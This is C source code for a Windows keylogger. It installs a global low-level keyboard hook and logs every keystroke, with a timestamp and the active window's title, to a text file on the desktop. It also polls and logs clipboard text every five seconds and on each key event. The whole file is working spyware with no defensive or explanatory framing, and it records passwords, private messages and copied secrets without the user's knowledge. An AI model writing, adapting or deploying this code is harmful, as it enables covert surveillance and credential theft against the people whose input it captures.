#include <windows.h>
#include <stdio.h>
#include <time.h>

#define LOG_FILE "C:\\Users\\jareste\\Desktop\\keylog.txt"

void LogKeystroke(char* keystroke)
{
    FILE* file = fopen(LOG_FILE, "a");
    if (!file) return;

    time_t t = time(NULL);
    struct tm* tm_info = localtime(&t);
    char time_str[20];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm_info);

    HWND hwnd = GetForegroundWindow();
    char windowTitle[256];
    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));

    fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
    fclose(file);
}

// void LogClipboardContent(void)
// {
//     if (OpenClipboard(NULL))
//     {
//         HANDLE hData = GetClipboardData(CF_TEXT);
//         if (hData)
//         {
//             char* clipboardText = (char*)GlobalLock(hData);
//             if (clipboardText)
//             {
//                 LogKeystroke(clipboardText);
//                 GlobalUnlock(hData);
//             }
//         }
//         CloseClipboard();
//     }
// }

void LogClipboardContent(void)
{
    if (OpenClipboard(NULL))
    {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData)
        {
            char* clipboardText = (char*)GlobalLock(hData);
            if (clipboardText)
            {
                LogKeystroke(clipboardText);
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
}

DWORD WINAPI ClipboardLoggerThread(LPVOID lpParam)
{
    (void)lpParam;
    while (1)
    {
        LogClipboardContent();
        Sleep(5000);
    }
    return 0;
}

void LogKeyPress(DWORD vkCode)
{
    HKL keyboardLayout = GetKeyboardLayout(0);
    BYTE keyboardState[256];
    char keyName[16] = {0};

    if (!GetKeyboardState(keyboardState)) return;

    int len = ToAsciiEx(vkCode, MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, keyboardLayout),
                        keyboardState, (LPWORD)keyName, 0, keyboardLayout);

    if (len == 1)
    {
        keyName[1] = '\0';
        LogKeystroke(keyName);
    }
    else if (vkCode == VK_RETURN)
    {
        LogKeystroke("[ENTER]");
    }
    else if (vkCode == VK_SPACE)
    {
        LogKeystroke("[SPACE]");
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            LogKeyPress(pKeyBoard->vkCode);
        }
    }
    LogClipboardContent();
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void)
{
    HANDLE hClipboardThread = CreateThread(NULL, 0, ClipboardLoggerThread, NULL, 0, NULL);

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook)
    {
        printf("Failed to install hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    CloseHandle(hClipboardThread);
    return 0;
}
